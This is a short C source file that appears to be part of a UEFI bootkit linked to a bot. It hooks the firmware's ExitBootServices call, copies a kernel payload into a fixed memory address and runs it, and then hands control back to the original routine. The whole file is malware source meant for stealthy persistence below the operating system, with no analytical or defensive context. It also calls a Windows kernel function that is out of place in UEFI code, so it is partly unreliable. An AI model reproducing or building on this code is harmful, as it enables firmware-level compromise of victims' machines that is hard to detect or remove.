#include "DXEHook.h"
#include "BootkitDefs.h"
#include "../Bot/BotStartup.h"
#include "../Shared/MemTools.h"

#include <Library/BaseMemoryLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/MemoryAllocationLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>

static EFI_EXIT_BOOT_SERVICES OriginalExitBootServices = NULL;

EFI_STATUS EFIAPI HookedExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey) {
    VOID* KernelRegion = MmMapIoSpace(KERNEL_PAYLOAD_ADDRESS, 0x2000, TRUE);
    if (KernelRegion) {
        CopyMem(KernelRegion, KernelMain, 0x1000);

        ((void(*)())KernelRegion)();
    }

    gBS->ExitBootServices = OriginalExitBootServices;
    return OriginalExitBootServices(ImageHandle, MapKey);
}

EFI_STATUS InstallExitBootServicesHook(void) {
    if (!gBS || !gST) return EFI_NOT_READY;

    OriginalExitBootServices = gBS->ExitBootServices;
    gBS->ExitBootServices = HookedExitBootServices;
    return EFI_SUCCESS;
}
